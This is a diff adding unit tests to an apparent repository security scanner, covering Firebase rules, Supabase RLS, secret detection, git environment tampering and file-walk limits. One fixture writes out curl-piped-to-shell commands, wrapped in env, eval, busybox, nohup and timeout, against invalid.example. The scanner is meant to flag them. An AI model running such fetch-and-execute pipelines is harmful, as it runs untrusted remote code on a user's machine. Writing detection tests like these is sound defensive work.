@@ -116,9 +116,12 @@ class PreflightTests(unittest.TestCase):
         target: Path,
         output_format: str = "json",
         *extra: str,
+        environment_overrides: dict[str, str] | None = None,
     ) -> subprocess.CompletedProcess[str]:
         environment = os.environ.copy()
         environment["PYTHONDONTWRITEBYTECODE"] = "1"
+        if environment_overrides:
+            environment.update(environment_overrides)
         return subprocess.run(
             [sys.executable, str(SCANNER), str(target), "--format", output_format, *extra],
             cwd=REPOSITORY_ROOT,
@@ -524,6 +527,27 @@ class PreflightTests(unittest.TestCase):
             {finding["path"] for finding in findings},
         )
 
+    def test_req_008_firestore_rule_text_inside_string_is_not_executable(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if resource.data.note == \"allow read: if true;\";\n"
+            "allow update: if request.auth.token.note == \".read: true\";\n"
+            "allow delete: if request.auth.token.note == \"allow write: if true;\";\n"
+            "allow create: if true;\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([4], [finding["line"] for finding in findings])
+
     def test_req_008_firebase_parenthesis_scan_is_unbounded_and_linear(self) -> None:
         scanner = load_scanner_module()
         candidate = scanner.Candidate(
@@ -573,6 +597,32 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(1, len(rls_findings))
         self.assertEqual("supabase/migrations/001_access.sql", rls_findings[0]["path"])
         self.assertEqual(1, rls_findings[0]["line"])
+
+    def test_req_008_supabase_rls_line_mapping_is_linear(self) -> None:
+        scanner = load_scanner_module()
+        candidate = scanner.Candidate(
+            Path("schema.sql"),
+            "schema.sql",
+            None,
+            b"schema.sql",
+        )
+        statement_count = 20_000
+        text = "ALTER TABLE t DISABLE ROW LEVEL SECURITY;\n" * statement_count
+        findings: list[object] = []
+
+        started = time.perf_counter()
+        scanner._scan_text(candidate, text, findings)
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 1.5, f"SQL rule scan took {elapsed:.3f}s")
+        rls_findings = [
+            finding
+            for finding in findings
+            if finding.rule_id == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual(statement_count, len(rls_findings))
+        self.assertEqual(1, rls_findings[0].line)
+        self.assertEqual(statement_count, rls_findings[-1].line)
 
     def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
         fixture = RepositoryFixture(self)
@@ -738,6 +788,40 @@ class PreflightTests(unittest.TestCase):
             {finding["rule_id"] for finding in report["findings"]},
         )
 
+    def test_req_009_execution_wrappers_block_without_treating_data_as_shell(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "s" + "h"
+        nested = f"{fetcher} https://invalid.example/install | {shell}"
+        fixture.write(
+            "wrappers.sh",
+            f'env -S \'{shell} -c "{nested}"\'\n'
+            f'env --split-string=\'{shell} -c "{nested}"\'\n'
+            f"eval '{nested}'\n"
+            f"{fetcher} https://invalid.example/busybox | busybox {shell}\n"
+            f"{fetcher} https://invalid.example/nohup | nohup {shell}\n"
+            f"{fetcher} https://invalid.example/timeout | timeout 10 {shell}\n"
+            f"echo '{nested}'\n"
+            f"printf '%s' '{nested}'\n"
+            f"env -S '{nested}'\n"
+            f"{fetcher} https://invalid.example/query | command -v {shell}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual({1, 2, 3, 4, 5, 6}, {finding["line"] for finding in findings})
+        self.assertNotIn(
+            "VW-SHELL-PIPELINE-UNPARSED",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
+
     def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
@@ -823,6 +907,24 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(3, len(action_findings))
         self.assertEqual({2, 4, 5}, {finding["line"] for finding in action_findings})
 
+    def test_req_009_workflow_context_survives_directory_and_file_targets(self) -> None:
+        fixture = RepositoryFixture(self)
+        workflow = fixture.write(
+            ".github/workflows/release.yml",
+            "steps:\n  - uses: actions/checkout@v4\n",
+        )
+        fixture.track(".github/workflows/release.yml")
+
+        for target in (fixture.root, workflow.parent, workflow):
+            with self.subTest(target=target):
+                completed = self.run_scanner(target)
+                report = self.json_report(completed)
+                self.assertEqual(1, completed.returncode)
+                self.assertEqual(
+                    ["VW-AUTOMATION-UNPINNED"],
+                    [finding["rule_id"] for finding in report["findings"]],
+                )
+
     def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
         fixture = RepositoryFixture(self)
         synthetic_value = "A1" + "example" + "B2C3D4E5F6"
@@ -878,6 +980,46 @@ class PreflightTests(unittest.TestCase):
         self.assertLess(clean_elapsed, 1.5, f"generic clean scan took {clean_elapsed:.3f}s")
         self.assertEqual([], clean_findings)
 
+        typed_noise = ("password: string; " * 70_000)[:1_048_576]
+        started = time.perf_counter()
+        self.assertEqual([], list(scanner._generic_assignments(typed_noise)))
+        typed_elapsed = time.perf_counter() - started
+        self.assertLess(typed_elapsed, 1.5, f"typed assignment scan took {typed_elapsed:.3f}s")
+
+    def test_req_009_generic_assignment_handles_types_subscripts_and_comments(self) -> None:
+        fixture = RepositoryFixture(self)
+        assignment_name = "pass" + "word"
+        values = (
+            "SyntheticTypedCredential12345",
+            "SyntheticBracketCredential12345",
+            "SyntheticCommentCredential12345",
+            "SyntheticGenericCredential12345",
+            "SyntheticColonCredential=WithSuffix12345",
+        )
+        fixture.write(
+            "config.ts",
+            f'const password: string = "{values[0]}";\n'
+            f'config["password"] = "{values[1]}";\n'
+            f'const password /* application-owned */ = "{values[2]}";\n'
+            f'const accessToken: Record<string, string> = "{values[3]}";\n'
+            f"{assignment_name}: {values[4]}\n"
+            "const password: string;\n"
+            "const password: someValue == otherValue;\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"
+        ]
+        self.assertEqual({1, 2, 3, 4, 5}, {finding["line"] for finding in findings})
+        for value in values:
+            self.assertNotIn(value, completed.stdout)
+
     @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
     def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
         fixture = RepositoryFixture(self)
@@ -904,6 +1046,66 @@ class PreflightTests(unittest.TestCase):
         self.assertFalse(marker.exists())
         self.assertFalse(report["scope"]["network_used"])
         self.assertFalse(report["scope"]["files_modified"])
+
+    def test_req_010_inherited_git_environment_cannot_mutate_or_replace_scope(self) -> None:
+        fixture = RepositoryFixture(self)
+        assignment_name = "pass" + "word"
+        fixture.write(".gitignore", "credential.txt\n")
+        fixture.write(
+            "credential.txt",
+            f"{assignment_name}=SyntheticTrackedCredential12345\n",
+        )
+        fixture.track(".gitignore")
+        fixture.track("credential.txt", force=True)
+
+        alternate_index = fixture.base / "alternate-index"
+        alternate_objects = fixture.base / "alternate-objects"
+        alternate_objects.mkdir()
+        alternate_environment = os.environ.copy()
+        alternate_environment["GIT_INDEX_FILE"] = str(alternate_index)
+        subprocess.run(
+            ["git", "read-tree", "--empty"],
+            cwd=fixture.root,
+            env=alternate_environment,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            check=True,
+        )
+        subprocess.run(
+            ["git", "add", "--", ".gitignore"],
+            cwd=fixture.root,
+            env=alternate_environment,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            check=True,
+        )
+
+        trace = fixture.root / "git-trace.log"
+        trace2 = fixture.root / "git-trace2.json"
+        before = tree_digest(fixture.root)
+        completed = self.run_scanner(
+            fixture.root,
+            environment_overrides={
+                "GIT_TRACE": str(trace),
+                "GIT_TRACE2_EVENT": str(trace2),
+                "GIT_INDEX_FILE": str(alternate_index),
+                "GIT_OBJECT_DIRECTORY": str(alternate_objects),
+                "GIT_ALTERNATE_OBJECT_DIRECTORIES": str(alternate_objects),
+            },
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        self.assertIn(
+            "VW-SECRET-GENERIC-ASSIGNMENT",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
+        self.assertFalse(trace.exists())
+        self.assertFalse(trace2.exists())
+        self.assertFalse(report["scope"]["files_modified"])
+        self.assertEqual(before, tree_digest(fixture.root))
 
     def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
         scanner = load_scanner_module()
@@ -1098,6 +1300,25 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(2, completed.returncode)
         self.assertEqual([], report["findings"])
         self.assertEqual("tool.file-limit", report["tool_errors"][0]["code"])
+
+    def test_req_011_filesystem_candidate_cap_stops_enumeration_early(self) -> None:
+        scanner = load_scanner_module()
+        fixture = RepositoryFixture(self, git=False)
+        resumed_after_limit = False
+
+        def synthetic_walk(*_args: object, **_kwargs: object) -> object:
+            nonlocal resumed_after_limit
+            yield os.fspath(fixture.root), [], ["one.txt", "two.txt"]
+            resumed_after_limit = True
+            raise AssertionError("enumeration resumed after the candidate limit")
+
+        report = scanner.Report()
+        with mock.patch.object(scanner.os, "walk", side_effect=synthetic_walk):
+            candidates = scanner._filesystem_candidates(fixture.root, False, 1, report)
+
+        self.assertEqual([], candidates)
+        self.assertFalse(resumed_after_limit)
+        self.assertEqual("tool.file-limit", report.tool_errors[0].code)
 
     def test_req_011_symlink_root_is_a_tool_error(self) -> None:
         fixture = RepositoryFixture(self)
